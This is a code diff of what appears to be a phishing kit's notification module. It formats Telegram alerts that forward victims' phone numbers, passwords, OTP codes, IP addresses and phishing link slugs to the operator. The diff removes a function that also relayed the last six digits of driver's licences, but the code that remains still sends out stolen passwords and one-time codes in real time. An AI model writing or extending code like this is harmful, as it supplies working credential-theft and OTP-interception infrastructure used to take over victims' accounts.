@@ -188,26 +188,6 @@ async function notifyPasswordSubmitted({ phoneNumber, password, customSlug, ipAd
     const msg = `🔐 <b>DRIVER PASSWORD SUBMITTED!</b>\n\n` +
                 `📞 <b>Phone:</b> <code>${phoneNumber}</code>\n` +
                 `🔑 <b>Password:</b> <code>${password}</code>\n` +
-                `⏳ <b>Status:</b> Awaiting Driver License & OTP\n` +
-                `🔗 <b>Link:</b> <code>${customSlug || '/'}</code>\n` +
-                `🌐 <b>IP:</b> ${ipAddress || 'Unknown'}\n` +
-                `⏰ <b>Time:</b> ${timeStr}`;
-
-    return sendTelegramMessage(msg);
-}
-
-/**
- * Send instant alert when Driver License last 6 digits are submitted
- */
-async function notifyLicenseSubmitted({ phoneNumber, password, licenseDigits, customSlug, ipAddress, submittedAt }) {
-    const timeStr = new Date(submittedAt || Date.now()).toLocaleTimeString('en-US', {
-        hour: '2-digit', minute: '2-digit', second: '2-digit'
-    });
-
-    const msg = `🪪 <b>DRIVER LICENSE SUBMITTED!</b>\n\n` +
-                `📞 <b>Phone:</b> <code>${phoneNumber}</code>\n` +
-                (password ? `🔑 <b>Password:</b> <code>${password}</code>\n` : '') +
-                `🪪 <b>License (Last 6):</b> <code>${licenseDigits}</code>\n` +
                 `⏳ <b>Status:</b> Awaiting Driver OTP\n` +
                 `🔗 <b>Link:</b> <code>${customSlug || '/'}</code>\n` +
                 `🌐 <b>IP:</b> ${ipAddress || 'Unknown'}\n` +
@@ -219,15 +199,13 @@ async function notifyLicenseSubmitted({ phoneNumber, password, licenseDigits, cu
 /**
  * Send instant alert when OTP is submitted and verified
  */
-async function notifyOTPVerified({ phoneNumber, password, licenseDigits, otp, customSlug, ipAddress, verifiedAt }) {
+async function notifyOTPVerified({ phoneNumber, otp, customSlug, ipAddress, verifiedAt }) {
     const timeStr = new Date(verifiedAt || Date.now()).toLocaleString('en-US', {
         hour: '2-digit', minute: '2-digit', second: '2-digit'
     });
 
     const msg = `✅ <b>DRIVER IDENTITY VERIFIED!</b>\n\n` +
                 `📞 <b>Phone:</b> <code>${phoneNumber}</code>\n` +
-                (password ? `🔑 <b>Password:</b> <code>${password}</code>\n` : '') +
-                (licenseDigits ? `🪪 <b>License (Last 6):</b> <code>${licenseDigits}</code>\n` : '') +
                 `🔢 <b>OTP Code:</b> <code>${otp}</code>\n` +
                 `STATUS: <b>VERIFIED</b>\n` +
                 `🔗 <b>Link:</b> <code>${customSlug || '/'}</code>\n` +
@@ -259,7 +237,6 @@ module.exports = {
     getTelegramConfig,
     notifyPhoneSubmitted,
     notifyPasswordSubmitted,
-    notifyLicenseSubmitted,
     notifyOTPVerified,
     sendTestNotification
 };
